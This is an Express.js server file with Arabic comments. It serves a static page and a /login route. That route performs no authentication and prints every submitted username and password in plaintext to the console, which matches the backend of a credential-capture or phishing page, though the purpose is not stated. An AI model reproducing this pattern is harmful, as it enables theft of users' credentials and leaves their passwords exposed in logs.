const express = require('express');
const app = express();
const path = require('path');

// 1. إعدادات أساسية لتمكين السيرفر من قراءة البيانات القادمة من الواجهة (Form)
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// 2. تحديد مجلد public لقراءة ملفات الـ HTML والـ CSS
app.use(express.static(path.join(__dirname, 'public')));

// 3. توجيه الرابط الرئيسي للموقع ليفتح ملف index.html تلقائياً
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 4. الرابط المسؤول عن استقبال البيانات (عند الضغط على زر الإرسال أو الدخول)
app.post('/login', (req, res) => {
    // استقبال البيانات القادمة من الفورم
    const { username, password } = req.body;

    // طباعة البيانات في الـ Terminal الخاص بـ Node.js لرؤيتها فوراً
    console.log("=====================================");
    console.log("📥 تم استقبال بيانات جديدة بنجاح!");
    console.log(`👤 اسم المستخدم أو الإيميل: ${username}`);
    console.log(`🔑 كلمة المرور المستلمة: ${password}`);
    console.log("=====================================");

    // رد السيرفر على المتصفح بعد استلام البيانات (يمكنك تعديل هذه الرسالة أو توجيهه لصفحة أخرى)
    res.send('<h1>تم استقبال البيانات بنجاح في السيرفر!</h1>');
});

// 5. إعداد المنفذ (PORT) ليعمل محلياً وعلى Railway تلقائياً
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 السيرفر يعمل بنجاح على المنفذ: ${PORT}`);
    console.log(`🔗 لتجربة الموقع محلياً افتحي: http://localhost:${PORT}`);
});
